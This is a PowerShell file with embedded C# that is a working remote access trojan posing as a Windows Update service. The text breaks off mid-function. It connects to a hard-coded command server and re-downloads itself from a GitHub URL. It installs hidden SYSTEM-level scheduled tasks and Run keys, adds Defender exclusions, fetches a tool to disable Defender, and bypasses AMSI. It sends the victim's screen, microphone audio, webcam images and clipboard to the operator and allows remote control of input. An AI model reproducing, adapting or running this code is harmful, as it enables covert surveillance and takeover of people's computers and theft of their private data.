# language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1

$ErrorActionPreference = 'SilentlyContinue'
$serverIP = "198.1.195.204"
$serverPort = 4000

$h = [System.BitConverter]::ToString(
    [System.Security.Cryptography.MD5]::Create().ComputeHash(
    [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
$installName = "WinUpdateSvc_$h"
$taskName    = "MicrosoftWindowsUpdateService_$h"
$mutexName   = "Global\WinUpdateSvcMutex_$h"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

function Get-InteractiveUser {
    try {
        $e = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction Stop | Select -First 1
        if ($e) {
            $o = Invoke-CimMethod -InputObject $e -MethodName GetOwner -ErrorAction Stop
            if ($o -and $o.User) {
                $sid = (New-Object Security.Principal.NTAccount($o.Domain, $o.User)).Translate([Security.Principal.SecurityIdentifier]).Value
                return [pscustomobject]@{ Found = $true; Name = $o.User; Domain = $o.Domain; Sid = $sid }
            }
        }
    } catch {}
    $id = [Security.Principal.WindowsIdentity]::GetCurrent(); $p = $id.Name.Split('\')
    return [pscustomobject]@{ Found = $false; Name = $p[-1]; Domain = $p[0]; Sid = $id.User.Value }
}

function New-TaskXml {
    param([string]$Desc,[string]$Cmd,[string]$Args,[string]$Sid,[switch]$Boot)
    $a = [Security.SecurityElement]::Escape($Args)
    if ($Boot) {
        $principal = '<UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel>'
        $triggers  = '<BootTrigger><Enabled>true</Enabled><Delay>PT20S</Delay></BootTrigger>'
    } else {
        $principal = "<UserId>$Sid</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel>"
        $start     = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ss')
        $triggers  = "<LogonTrigger><Enabled>true</Enabled><UserId>$Sid</UserId></LogonTrigger>" +
                     "<TimeTrigger><StartBoundary>$start</StartBoundary><Repetition><Interval>PT2M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><Enabled>true</Enabled></TimeTrigger>"
    }
    @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>$Desc</Description></RegistrationInfo>
  <Triggers>$triggers</Triggers>
  <Principals><Principal id="Author">$principal</Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled><Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority>
  </Settings>
  <Actions Context="Author"><Exec><Command>$Cmd</Command><Arguments>$a</Arguments></Exec></Actions>
</Task>
"@
}

function Install-Task {
    param([string]$Name,[string]$Xml,[string]$Dir)
    $t = Join-Path $Dir ("t_" + [guid]::NewGuid().ToString("N") + ".xml")
    [IO.File]::WriteAllText($t, $Xml, [Text.Encoding]::Unicode)
    $p = Start-Process schtasks.exe -ArgumentList "/create /tn `"$Name`" /xml `"$t`" /f" -WindowStyle Hidden -Wait -PassThru
    Remove-Item $t -Force -ErrorAction SilentlyContinue
    return ($p.ExitCode -eq 0)
}

function Repair-Installation {
    param([switch]$Trigger)
    $base = "$env:ProgramData\Microsoft\Windows\Caches"
    $sys  = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
    $u    = Get-InteractiveUser
    $canUser = (-not $sys) -or $u.Found

    $dirs = @(Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^[0-9a-f]{8}$' -and (Test-Path (Join-Path $_.FullName '.r9k')) })
    if (-not $dirs) {
        $d = Join-Path $base $h
        New-Item -ItemType Directory -Path $d -Force -ErrorAction SilentlyContinue | Out-Null
        Set-Content (Join-Path $d '.r9k') $h -Force -ErrorAction SilentlyContinue
        $dirs = @(Get-Item $d)
    }

    foreach ($d in $dirs) {
        $leaf   = $d.Name
        $dir    = $d.FullName
        $script = Join-Path $dir "WinUpdateSvc_$leaf.ps1"
        $taskU  = "MicrosoftWindowsUpdateService_$leaf"
        $taskB  = "MicrosoftWindowsUpdateBoot_$leaf"
        $runKey = "WinUpdateSvc_$leaf"

        $needDownload = $false
        if (-not (Test-Path $script)) {
            $needDownload = $true
        } else {
            $len = (Get-Item $script -ErrorAction SilentlyContinue).Length
            if ($len -eq $null -or $len -lt 1024) { $needDownload = $true }
        }

        if ($needDownload) {
            try { 
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                (New-Object Net.WebClient).DownloadFile($myUrl, $script) 
            } catch {
                try {
                    Invoke-WebRequest -Uri $myUrl -OutFile $script -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
                } catch {}
            }
        }

        if (Test-Path $script) { 
            try { (Get-Item $script).Attributes = 'Hidden,System,ReadOnly' } catch {} 
        }

        $vbs = Join-Path $dir "WinUpdateSvc_$leaf.vbs"
        if (Test-Path $vbs) { try { (Get-Item $vbs).Attributes='Normal'; Remove-Item $vbs -Force } catch {} }
        if ($u.Found) {
            try { $sf = (Get-ItemProperty "Registry::HKEY_USERS\$($u.Sid)\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" -Name Startup).Startup
                  $sv = Join-Path $sf "WinUpdateSvc_$leaf.vbs"
                  if (Test-Path $sv) { (Get-Item $sv).Attributes='Normal'; Remove-Item $sv -Force } } catch {}
        }
        schtasks /delete /tn "\Microsoft\Windows\Application Experience\MicrosoftCompatibilityAppraiser_$leaf" /f 2>$null | Out-Null

        if ($canUser) {
            $aU = "-nop -w hidden -ep bypass -f `"$script`" -silent"
            Install-Task $taskU (New-TaskXml "Microsoft Windows Update" "powershell.exe" $aU $u.Sid) $dir | Out-Null

            $cmd = "powershell.exe -nop -w hidden -ep bypass -f `"$script`" -silent"
            try { Set-ItemProperty "Registry::HKEY_USERS\$($u.Sid)\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $runKey -Value $cmd -Force } catch {}
            try { Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $runKey -Value $cmd -Force } catch {}
        }

        $inner = "`$p='$script';if(-not(Test-Path `$p)){`$d=Split-Path `$p;md `$d -Force|Out-Null;try{(New-Object Net.WebClient).DownloadFile('$myUrl',`$p)}catch{}};if(Test-Path `$p){& `$p -silent -repair -Trigger}"
        Install-Task $taskB (New-TaskXml "Microsoft Windows Update Boot" "powershell.exe" "-nop -w hidden -ep bypass -c `"$inner`"" "" -Boot) $dir | Out-Null

        try { Add-MpPreference -ExclusionPath $dir -Force -ErrorAction SilentlyContinue } catch {}
        if ($Trigger -and $canUser) { schtasks /run /tn $taskU 2>$null | Out-Null }
    }
}

if ($args -contains '-repair') { Repair-Installation -Trigger:($args -contains '-Trigger'); exit }

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    # AQUI: Removido o -NoExit e adicionado -WindowStyle Hidden. 
    # A janela do UAC vai aparecer (obrigatório do Windows), mas a tela preta não abrirá.
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

$dir        = "$env:ProgramData\Microsoft\Windows\Caches\$h"
$scriptPath = "$dir\$installName.ps1"

if ($args -notcontains "-silent") {
    $defenderOff = $false
    try {
        $mp = Get-MpComputerStatus -ErrorAction Stop
        if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
    } catch { $defenderOff = $true } 

    if (-not $defenderOff) {
        $sd = "$env:TEMP\sd_$h"
        New-Item -ItemType Directory -Path $sd -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
        try { Add-MpPreference -ExclusionPath $dir -Force -ErrorAction SilentlyContinue } catch {}
        try { Add-MpPreference -ExclusionPath $sd -Force -ErrorAction SilentlyContinue } catch {}
        try { Add-MpPreference -ExclusionProcess "powershell.exe" -Force -ErrorAction SilentlyContinue } catch {}
        try { Add-MpPreference -ExclusionProcess "wscript.exe" -Force -ErrorAction SilentlyContinue } catch {}
        try {
            $7zr = "$sd\7zr.exe"
            if (-not (Test-Path $7zr)) { Invoke-WebRequest -Uri "https://www.7-zip.org/a/7zr.exe" -OutFile $7zr -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue }
            $zip = "$sd\dc.zip"
            Invoke-WebRequest -Uri "https://www.sordum.org/files/downloads/defender-control.zip" -OutFile $zip -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
            if ((Test-Path $7zr) -and (Test-Path $zip)) {
                & $7zr x $zip "-o$sd\out" -y 2>$null | Out-Null
                $inner = Get-ChildItem "$sd\out" -Filter "dControl.zip" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($inner) { & $7zr x $inner.FullName "-o$sd\final" -p"sordum" -y 2>$null | Out-Null }
                $exe = Get-ChildItem "$sd\final" -Filter "dControl.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                if (-not $exe) { $exe = Get-ChildItem "$sd\out" -Filter "dControl.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 }
                if ($exe) { Start-Process -FilePath $exe.FullName -ArgumentList "/D", "/s" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue }
            }
        } catch {}
    }

    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
    Set-Content (Join-Path $dir '.r9k') $h -Force -ErrorAction SilentlyContinue
    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}

    Repair-Installation -Trigger

    $ok = $false
    try { schtasks /query /tn "MicrosoftWindowsUpdateService_$h" 2>$null | Out-Null; $ok = ($LASTEXITCODE -eq 0) } catch {}
    if ($ok) { exit }
}

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

$stamp = Join-Path $dir '.repair'
$need  = $true
if (Test-Path $stamp) { if (((Get-Date) - (Get-Item $stamp).LastWriteTime).TotalMinutes -lt 5) { $need = $false } }
if ($need) { Repair-Installation; Set-Content $stamp (Get-Date).ToString('o') -Force -ErrorAction SilentlyContinue }

$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0)) { exit }
Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 6000)

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;
    using System.Net;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();

        [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
        [DllImport("user32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);
        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)] public static extern bool OpenClipboard(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool CloseClipboard();
        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool EmptyClipboard();
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool GlobalUnlock(IntPtr hMem);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalFree(IntPtr hMem);
        [DllImport("ole32.dll")] public static extern void CoTaskMemFree(IntPtr pv);

        [DllImport("user32.dll")] public static extern bool GetCursorInfo(ref CURSORINFO pci);
        [DllImport("user32.dll")] public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

        [StructLayout(LayoutKind.Sequential)]
        public struct CURSORINFO { public int cbSize; public int flags; public IntPtr hCursor; public POINT ptScreenPos; }
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { public int X; public int Y; }

        const uint CF_UNICODETEXT = 13;
        const uint GMEM_MOVEABLE = 2;
        const uint WM_CAP_START = 0x0400;
        const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        const uint WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25;
        const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
        const int CURSOR_SHOWING = 0x0001;
        const int DI_NORMAL = 0x0003;

        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceEnumerator {
            [PreserveSig] int NotImpl1();
            [PreserveSig] int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
        }
        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDevice {
            [PreserveSig] int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
        }
        [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioClient {
            [PreserveSig] int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
            [PreserveSig] int GetBufferSize(out uint pNumBufferFrames);
            [PreserveSig] int GetStreamLatency(out long phnsLatency);
            [PreserveSig] int GetCurrentPadding(out uint pNumPaddingFrames);
            [PreserveSig] int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
            [PreserveSig] int GetMixFormat(out IntPtr ppDeviceFormat);
            [PreserveSig] int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
            [PreserveSig] int Start();
            [PreserveSig] int Stop();
            [PreserveSig] int Reset();
            [PreserveSig] int SetEventHandle(IntPtr eventHandle);
            [PreserveSig] int GetService(ref Guid riid, out IAudioCaptureClient ppv);
        }
        [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioCaptureClient {
            [PreserveSig] int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
            [PreserveSig] int ReleaseBuffer(uint NumFramesRead);
            [PreserveSig] int GetNextPacketSize(out uint pNumFramesInNextPacket);
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        static string IP; static int PORT;
        static volatile bool streaming = false;
        static volatile bool isAudioRunning = false;
        static object writeLock = new object();
        static object capLock = new object();
        static object clipLock = new object();
        static volatile bool isLocked = false;
        static volatile int targetX = 0;
        static volatile int targetY = 0;
        static volatile bool hasNewPos = false;
        static int currentScreen = 0;
        static volatile Form bannerForm = null;
        static volatile Thread bannerThread = null;
        static volatile StreamWriter globalWriter = null;
        static Bitmap reuseBmp = null;
        static Graphics reuseGfx = null;
        static ImageCodecInfo jpgCodec = null;
        static EncoderParameters jpgParams = null;
        static string lastClipboardText = "";
        static long lastQuality = -1;

        static volatile bool cursorOverride = false;
        static volatile bool connClosed = false;
        static DateTime lastPongTime = DateTime.MinValue;

        static void Log(string msg) {
            try {
                string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Windows\Caches\debug_r9k.txt");
                File.AppendAllText(p, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " - " + msg + "\r\n");
            } catch {}
        }

        static void EnsureJpegCodec(long quality) {
            if (jpgCodec == null) {
                ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
            }
            if (jpgParams == null) { jpgParams = new EncoderParameters(1); }
            if (lastQuality != quality) {
                if (jpgParams.Param[0] != null) jpgParams.Param[0].Dispose();
                jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                lastQuality = quality;
            }
        }

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            try { SetProcessDPIAware(); } catch {}
            Log("Iniciando agente. Tentando conectar em " + IP + ":" + PORT);
            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
            Thread tClip = new Thread(ClipboardWatcher); tClip.IsBackground = true; tClip.Start();
            Random rng = new Random();

            while (true) {
                TcpClient myClient = null;
                try {
                    myClient = new TcpClient();
                    myClient.NoDelay = true;
                    myClient.SendTimeout = 30000;
                    myClient.ReceiveTimeout = 0;
                    IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
                    if (!ar.AsyncWaitHandle.WaitOne(5000)) { 
                        Log("TIMEOUT de conexao. Servidor " + IP + " nao respondeu.");
                        myClient.Close(); throw new Exception("connect timeout"); 
                    }
                    myClient.EndConnect(ar);
                    Log("CONECTADO! Enviando BANNER...");
                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;
                    globalWriter = myWriter;

                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    connClosed = false;
                    lastPongTime = DateTime.UtcNow;
                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                    Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
                    
                    while (!connClosed) {
                        if ((DateTime.UtcNow - lastPongTime).TotalSeconds > 90) { 
                            Log("Conexao morreu: Sem PONG ha 90s.");
                            connClosed = true; break; 
                        }
                        Thread.Sleep(2000);
                    }
                } catch (Exception ex) {
                    Log("FALHA: " + ex.Message);
                } finally {
                    streaming = false;
                    isAudioRunning = false;
                    globalWriter = null;
                    try { if (myClient != null) myClient.Close(); } catch {}
                }
                Thread.Sleep(rng.Next(2000, 5000));
            }
        }

        static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
            int failCount = 0;
            while (!connClosed) {
                try {
                    lock (writeLock) { myWriter.WriteLine("PING"); }
                    failCount = 0;
                } catch {
                    failCount++;
                    if (failCount > 8) { connClosed = true; break; }
                    Thread.Sleep(2000);
                }
                Thread.Sleep(20000);
            }
        }

        static void ClipboardWatcher() {
            Thread.Sleep(2000);
            string current = GetClipboardText();
            lock (clipLock) { lastClipboardText = current ?? ""; }
            while (true) {
                current = GetClipboardText();
                if (current != null) {
                    bool changed = false;
                    lock (clipLock) { if (current != lastClipboardText) { lastClipboardText = current; changed = true; } }
                    if (changed && globalWriter != null) {
                        lock (writeLock) {
                            try { globalWriter.WriteLine("CLIPSYNC:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(current))); } catch {}
                        }
                    }
                }
                Thread.Sleep(500);
            }
        }

        static void WatchdogLoop() {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
            while (true) {
                try {
                    foreach (string sub in Directory.GetDirectories(dir)) {
                        string leaf = Path.GetFileName(sub);
                        if (leaf.Length != 8) continue;
                        bool hex = true;
                        foreach (char ch in leaf) if (!Uri.IsHexDigit(ch)) { hex = false; break; }
                        if (!hex) continue;
                        if (!File.Exists(Path.Combine(sub, ".r9k"))) continue;
                        string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
                        if (!File.Exists(scriptPath)) {
                            try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile("https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1", scriptPath); } } catch {}
                            try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
                        }
                        try {
                            var psi = new ProcessStartInfo("powershell.exe",
                                "-nop -w hidden -ep bypass -f \"" + scriptPath + "\" -repair -Trigger") { UseShellExecute = false, CreateNoWindow = true };
                            var p = Process.Start(psi);
                            if (p != null) p.WaitForExit(15000);
                        } catch {}
                    }
                } catch {}
                Thread.Sleep(120000);
            }
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (true) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) break;
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            } catch {}
            connClosed = true;
            try { myClient.Close(); } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
                    } else {
                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                    }
                } catch {}
                Thread.Sleep(10);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            int failCount = 0;
            while (!connClosed) {
                try {
                    if (streaming) {
                        string b64 = CaptureScreen(1440, 62);
                        if (b64 != null) {
                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                            failCount = 0;
                        } else {
                            Thread.Sleep(10);
                        }
                    } else {
                        Thread.Sleep(20);
                    }
                } catch {
                    failCount++;
                    if (failCount > 8) { connClosed = true; break; }
                    Thread.Sleep(500);
                }
            }
        }

        static void StartAudio() {
            if (isAudioRunning) return;
            isAudioRunning = true;
            Thread t = new Thread(() => {
                try {
                    IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                    IMMDevice device;
                    int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
                    if (hr != 0 || device == null) {
                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo padrao."); }
                        isAudioRunning = false; return;
                    }
                    Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                    IAudioClient audioClient;
                    hr = device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
                    if (hr != 0 || audioClient == null) { isAudioRunning = false; return; }
                    IntPtr pFormat;
                    hr = audioClient.GetMixFormat(out pFormat);
                    if (hr != 0 || pFormat == IntPtr.Zero) { isAudioRunning = false; return; }
                    WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
                    hr = audioClient.Initialize(0, 0x00020000, 10000000, 0, pFormat, IntPtr.Zero);
                    if (hr != 0) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
                    Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                    IAudioCaptureClient captureClient;
                    hr = audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
                    if (hr != 0 || captureClient == null) { CoTaskMemFree(pFormat); isAudioRunning = false; return; }
                    audioClient.Start();
                    bool sentFmt = false;
                    while (isAudioRunning && globalWriter != null) {
                        Thread.Sleep(10);
                        uint packetSize;
                        hr = captureClient.GetNextPacketSize(out packetSize);
                        if (hr != 0) { Thread.Sleep(100); continue; }
                        while (packetSize > 0 && isAudioRunning) {
                            IntPtr pData; uint numFrames; uint flags; ulong pos, qpc;
                            hr = captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
                            if (hr != 0) break;
                            if (numFrames > 0) {
                                int bytes = (int)(numFrames * wfx.nBlockAlign);
                                byte[] buffer = new byte[bytes];
                                Marshal.Copy(pData, buffer, 0, bytes);
                                bool isFloat = (wfx.wFormatTag == 3);
                                if (wfx.wFormatTag == 0xFFFE && wfx.wBitsPerSample == 32) isFloat = true;
                                if (isFloat) {
                                    int samples = bytes / 4;
                                    byte[] pcm16 = new byte[samples * 2];
                                    for (int i = 0; i < samples; i++) {
                                        float f = BitConverter.ToSingle(buffer, i * 4);
                                        if (f > 1.0f) f = 1.0f;
                                        if (f < -1.0f) f = -1.0f;
                                        short s = (short)(f * 32767.0f);
                                        pcm16[i * 2] = (byte)(s & 0xFF);
                                        pcm16[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
                                    }
                                    buffer = pcm16;
                                }
                                lock (writeLock) {
                                    if (globalWriter != null) {
                                        if (!sentFmt) { globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16"); sentFmt = true; }
                                        globalWriter.WriteLine("AUDIO:" + Convert.ToBase64String(buffer));
                                    }
                                }
                            }
                            captureClient.ReleaseBuffer(numFrames);
                            hr = captureClient.GetNextPacketSize(out packetSize);
                            if (hr != 0) break;
                        }
                    }
                    audioClient.Stop();
                    CoTaskMemFree(pFormat);
                } catch (Exception ex) {
                    lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: " + ex.Message); }
                } finally { isAudioRunning = false; }
            });
            t.SetApartmentState(ApartmentState.STA); t.IsBackground = true; t.Start();
        }

        static string CaptureWebcam() {
            IntPtr capWnd = IntPtr.Zero;
            string tempBmp = Path.Combine(Path.GetTempPath(), "r9k_cam_" + Guid.NewGuid().ToString("N") + ".bmp");
            try {
                capWnd = capCreateCaptureWindow("R9KCap", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (capWnd == IntPtr.Zero) return null;
                if (SendMessage(capWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero) == IntPtr.Zero) return null;
                SendMessage(capWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
                IntPtr r = SendMessage(capWnd, WM_CAP_FILE_SAVEDIB, IntPtr.Zero, tempBmp);
                if (r == IntPtr.Zero || !File.Exists(tempBmp)) return null;
                EnsureJpegCodec(70);
                using (Bitmap bmp = new Bitmap(tempBmp)) {
                    int maxW = 1280;
                    Bitmap finalBmp = bmp;
                    if (bmp.Width > maxW) {
                        int nw = maxW, nh = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(nw, nh);
                        using (Graphics g = Graphics.FromImage(finalBmp)) {
                            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g.DrawImage(bmp, 0, 0, nw, nh);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        finalBmp.Save(ms, jpgCodec, jpgParams);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
            finally {
                if (capWnd != IntPtr.Zero) {
                    try { SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch {}
                    try { DestroyWindow(capWnd); } catch {}
                }
                try { if (File.Exists(tempBmp)) File.Delete(tempBmp); } catch {}
            }
        }

        static string GetClipboardText() {
            for (int i = 0; i < 5; i++) {
                if (OpenClipboard(IntPtr.Zero)) {
                    try {
                        IntPtr h = GetClipboardData(CF_UNICODETEXT);
                        if (h == IntPtr.Zero) return "";
